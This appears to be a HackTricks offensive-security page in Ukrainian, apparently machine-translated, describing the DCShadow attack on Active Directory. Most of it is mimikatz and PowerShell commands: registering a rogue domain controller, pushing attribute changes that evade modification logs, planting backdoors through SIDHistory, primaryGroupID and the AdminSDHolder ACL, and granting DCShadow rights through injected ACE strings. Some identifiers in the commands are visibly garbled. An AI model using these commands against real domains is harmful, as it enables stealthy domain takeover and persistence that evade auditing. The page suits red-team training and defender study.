{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}


# DCShadow

Він реєструє **новий контролер домену** в AD і використовує його для **поширення атрибутів** (SIDHistory, SPNs...) на вказаних об'єктах **без** залишення будь-яких **логів** щодо **модифікацій**. Вам **потрібні DA** привілеї та бути всередині **кореневого домену**.\
Зверніть увагу, що якщо ви використовуєте неправильні дані, з'являться досить неприємні логи.

Для виконання атаки вам потрібно 2 екземпляри mimikatz. Один з них запустить RPC сервери з привілеями SYSTEM (тут потрібно вказати зміни, які ви хочете виконати), а інший екземпляр буде використаний для поширення значень:

{% code title="mimikatz1 (RPC servers)" %}
```bash
!+
!processtoken
lsadump::dcshadow /object:username /attribute:Description /value="My new description"
```
{% endcode %}

{% code title="mimikatz2 (push) - Потрібен DA або подібний" %}
```bash
lsadump::dcshadow /push
```
{% endcode %}

Зверніть увагу, що **`elevate::token`** не працюватиме в сесії `mimikatz1`, оскільки це підвищило привілеї потоку, але нам потрібно підвищити **привілей процесу**.\
Ви також можете вибрати об'єкт "LDAP": `/object:CN=Administrator,CN=Users,DC=JEFFLAB,DC=local`

Ви можете внести зміни від DA або від користувача з мінімальними правами:

* В **об'єкті домену**:
* _DS-Install-Replica_ (Додати/Видалити репліку в домені)
* _DS-Replication-Manage-Topology_ (Управління топологією реплікації)
* _DS-Replication-Synchronize_ (Синхронізація реплікації)
* **Об'єкт сайтів** (та його нащадки) в **контейнері конфігурації**:
* _CreateChild and DeleteChild_
* Об'єкт **комп'ютера, який зареєстрований як DC**:
* _WriteProperty_ (Не записувати)
* **Цільовий об'єкт**:
* _WriteProperty_ (Не записувати)

Ви можете використовувати [**Set-DCShadowPermissions**](https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1), щоб надати ці привілеї непривілейованому користувачу (зверніть увагу, що це залишить деякі журнали). Це набагато більш обмежувально, ніж мати привілеї DA.\
Наприклад: `Set-DCShadowPermissions -FakeDC mcorp-student1 SAMAccountName root1user -Username student1 -Verbose`  Це означає, що ім'я користувача _**student1**_ при вході в машину _**mcorp-student1**_ має DCShadow привілеї над об'єктом _**root1user**_.

## Використання DCShadow для створення бекдорів

{% code title="Встановити Enterprise Admins в SIDHistory для користувача" %}
```bash
lsadump::dcshadow /object:student1 /attribute:SIDHistory /value:S-1-521-280534878-1496970234-700767426-519
```
{% endcode %}

{% code title="Змінити PrimaryGroupID (додати користувача до членів Domain Administrators)" %}
```bash
lsadump::dcshadow /object:student1 /attribute:primaryGroupID /value:519
```
{% endcode %}

{% code title="Змінити ntSecurityDescriptor AdminSDHolder (надати повний контроль користувачу)" %}
```bash
#First, get the ACE of an admin already in the Security Descriptor of AdminSDHolder: SY, BA, DA or -519
(New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=Admin SDHolder,CN=System,DC=moneycorp,DC=local")).psbase.Objec tSecurity.sddl
#Second, add to the ACE permissions to your user and push it using DCShadow
lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local /attribute:ntSecurityDescriptor /value:<whole modified ACL>
```
{% endcode %}

## Shadowception - Надати права DCShadow за допомогою DCShadow (без змінених журналів прав)

Нам потрібно додати наступні ACE з SID нашого користувача в кінці:

* На об'єкті домену:
* `(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
* `(OA;;CR;9923a32a-3607-11d2-b9be-0000f87a36b2;;UserSID)`
* `(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
* На об'єкті комп'ютера атакуючого: `(A;;WP;;;UserSID)`
* На об'єкті цільового користувача: `(A;;WP;;;UserSID)`
* На об'єкті Сайтів у контейнері Конфігурації: `(A;CI;CCDC;;;UserSID)`

Щоб отримати поточний ACE об'єкта: `(New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=moneycorp,DC=loca l")).psbase.ObjectSecurity.sddl`

Зверніть увагу, що в цьому випадку вам потрібно зробити **кілька змін,** а не лише одну. Тому, в **сесії mimikatz1** (RPC сервер) використовуйте параметр **`/stack` з кожною зміною,** яку ви хочете внести. Таким чином, вам потрібно буде **`/push`** лише один раз, щоб виконати всі накопичені зміни на ружому сервері.



[**Більше інформації про DCShadow на ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)


{% hint style="success" %}
Вчіться та практикуйте AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Вчіться та практикуйте GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Підтримати HackTricks</summary>

* Перевірте [**плани підписки**](https://github.com/sponsors/carlospolop)!
* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи telegram**](https://t.me/peass) або **слідкуйте** за нами в **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Діліться хакерськими трюками, надсилаючи PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) та [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) репозиторіїв на github.

</details>
{% endhint %}
